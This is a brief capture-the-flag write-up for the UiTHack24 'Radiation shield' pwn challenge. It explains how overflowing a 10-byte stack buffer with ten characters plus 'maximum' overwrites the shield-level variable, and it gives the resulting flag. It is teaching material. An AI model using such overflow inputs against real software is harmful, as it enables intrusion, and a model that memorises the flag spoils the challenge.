> # Radiation shield
> > Pwn - 50pts
>
> Deep within the space station "Pandora", a looming solar flare threatens the lives of the station's crew. <br>
> The crew is locked out of the radiation shield controls, so you must hack into the system to increase the shield's protection to `maximum`.

## Writeup
We have to set the shield level to `maximum`. The `shield_control` function reads in 20 bytes, but tries to store it in a buffer with a size of 10, causing a stack overflow. If we add more than 10 characters we can see this overflow by the output of the program.
```
New shield status:
aaaaaaaaaaaaaaa
Shield status: aaaaaaaaaaaaaaa

Shield level: aaaaa
```

If we write 10 a's (or any other character), and then the word `maximum`, we will overflow the buffer storing the shield level, and get the flag.
```
New shield status:
aaaaaaaaaamaximum
Shield status: aaaaaaaaaamaximum

Shield level: maximum

UiTHack24{M4ximum_sh13ld_0verflooow}
```
